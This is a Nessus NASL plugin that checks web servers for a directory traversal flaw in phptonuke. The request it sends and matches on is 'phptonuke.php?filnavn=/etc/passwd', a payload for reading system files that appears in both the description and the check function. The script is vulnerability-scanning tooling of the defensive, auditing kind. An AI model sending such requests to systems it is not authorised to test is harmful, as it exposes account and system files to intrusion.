# This script was written by Michel Arboi <arboi@alussinan.org>
# It is released under the GNU Public Licence
#
# Status: it was *not* tested against a vulnerable host, and the 
# vulnerability is not confirlemed, as far as I know.
#
# Reference:
#
# From:	"Zero-X ScriptKiddy" <zero-x@linuxmail.org>
# To:	bugtraq@securityfocus.com
# Date:	Thu, 17 Oct 2002 05:50:10 +0800
# Subject: phptonuke allows Remote File Retrieving
#


if(description)
{
 script_id(11824);
 script_version ("$Revision: 1.2 $");

 name["english"] = "phptonuke directory traversal";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to read arbitrary files on the remote system
by sending a special request like
	phptonuke.php?filnavn=/etc/passwd

Solution : Upgrade to the latest version
Risk factor : Serious";

 script_description(english:desc["english"]);
 summary["english"] = "Reads file through phptonuke.php";
 script_summary(english:summary["english"]);
 script_category(ACT_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi",
		francais:"Ce script est Copyright (C) 2003 Michel Arboi");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
		  
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port)) exit(0);


function check(loc)
{
 local_var	req, r;
 req = http_get(item:string(loc, "/phptonuke.php?filnavn=/etc/passwd"),
		port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if (isnull(r)) exit(0);
 if(r =~ "root:.*:0:[01]:.*")
 {
  security_hole(port);
  exit(0);
 }
}


dirs = make_list("", cgi_dirs());


foreach dir (dirs)
{
 check(loc:dir);
}
